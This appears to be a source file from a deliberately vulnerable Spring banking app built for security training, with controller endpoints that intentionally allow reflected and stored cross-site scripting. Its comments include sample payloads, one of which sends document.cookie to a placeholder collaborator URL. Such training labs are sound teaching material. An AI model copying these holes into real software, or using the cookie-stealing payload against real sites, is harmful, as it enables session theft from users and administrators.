package com.vulnbank.controller;

import com.vulnbank.model.Message;
import com.vulnbank.repository.MessageRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import java.util.List;

/**
 * A03:2021 Injection (Cross-Site Scripting is classified under Injection
 * in the OWASP Top 10 2021).
 */
@Controller
public class MessageController {

    @Autowired
    private MessageRepository messageRepository;

    /**
     * VULNERABLE: `q` is rendered back into the page with Thymeleaf's
     * unescaped [[${...}]] syntax (see search.html) - reflected XSS.
     * Try: /search?q=<script>alert(document.cookie)</script>
     */
    @GetMapping("/search")
    public String search(@RequestParam(required = false, defaultValue = "") String q, Model model) {
        model.addAttribute("query", q);
        return "search";
    }

    @GetMapping("/messages")
    public String messages(Model model) {
        model.addAttribute("messages", messageRepository.findAll());
        return "messages";
    }

    /**
     * VULNERABLE: stored XSS. Message content is saved as-is and later
     * rendered unescaped for every viewer (support staff / admins) on
     * GET /messages. Try posting content:
     *   <img src=x onerror=fetch('https://your-collab-url/'+document.cookie)>
     * and then load /messages as a different "user" to see it fire.
     */
    @PostMapping("/messages")
    public String postMessage(@RequestParam String sender, @RequestParam String content) {
        Message m = new Message();
        m.setSender(sender);
        m.setContent(content);
        messageRepository.save(m);
        return "redirect:/messages";
    }
}
